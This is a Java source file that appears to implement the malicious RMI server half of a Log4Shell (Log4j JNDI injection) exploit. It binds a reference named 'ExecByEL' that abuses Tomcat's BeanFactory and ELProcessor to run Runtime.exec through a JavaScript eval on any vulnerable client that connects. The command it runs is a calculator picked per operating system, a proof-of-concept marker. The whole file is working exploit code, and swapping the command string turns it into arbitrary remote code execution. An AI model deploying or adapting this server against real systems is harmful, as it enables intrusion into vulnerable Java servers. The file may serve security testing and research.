package com.log4j.exploit.rmi;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.NamingException;
import javax.naming.StringRefAddr;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RmiServer {

    private static final String COMMAND_MAC = "open -a Calculator";
    private static final String COMMAND_WIN = "calc.exe";
    private static final String COMMAND_LINUX = "gnome-calculator";
    // private static final String COMMAND_LINUX_TEST = "touch /tmp/log4shell_worked.txt";


    private ReferenceWrapper execByEL() throws RemoteException, NamingException {
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        
        ref.add(new StringRefAddr("forceString", "x=eval"));

        String osName = System.getProperty("os.name").toLowerCase();
        String commandToExecute;

        if (osName.contains("win")) {
            commandToExecute = COMMAND_WIN;
        } else if (osName.contains("nix") || osName.contains("nux") || osName.contains("aix")) {
            commandToExecute = COMMAND_LINUX; 
            // commandToExecute = COMMAND_LINUX_TEST; 
        } else if (osName.contains("mac")) {
            commandToExecute = COMMAND_MAC;
        } else {
            System.err.println("Unrecognized operating system (" + osName + ") for calculator command. Defaulting to macOS command.");
            commandToExecute = COMMAND_MAC;
        }
        
        System.out.println("[RMI Server] Selected command for execution: " + commandToExecute);

        String javascriptPayload = String.format(
                "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(" +
                        "\"java.lang.Runtime.getRuntime().exec('%s')\"" + 
                        ")", commandToExecute.replace("'", "\\'")); 

        ref.add(new StringRefAddr("x", javascriptPayload));

        return new ReferenceWrapper(ref);
    }

    public static void main(String[] args) {
        try {
            System.out.println("[RMI Server] Creating RMI registry on port 1099...");
            LocateRegistry.createRegistry(1099);
            System.out.println("[RMI Server] RMI registry created.");
        } catch (RemoteException e) {
            System.out.println("[RMI Server] RMI registry already exists or error during creation (continuing): " + e.getMessage());
        }

        try {
            RmiServer rmiServer = new RmiServer();
            Registry registry = LocateRegistry.getRegistry(1099); 
            
            System.out.println("[RMI Server] Binding remote exploit to 'ExecByEL'...");
            registry.bind("ExecByEL", rmiServer.execByEL());
            System.out.println("[RMI Server] Exploit bound successfully. Waiting for JNDI connections...");
        } catch (Exception e) {
            System.err.println("[RMI Server] Exception during RMI server initialization or exploit binding:");
            e.printStackTrace();
        }
    }
}
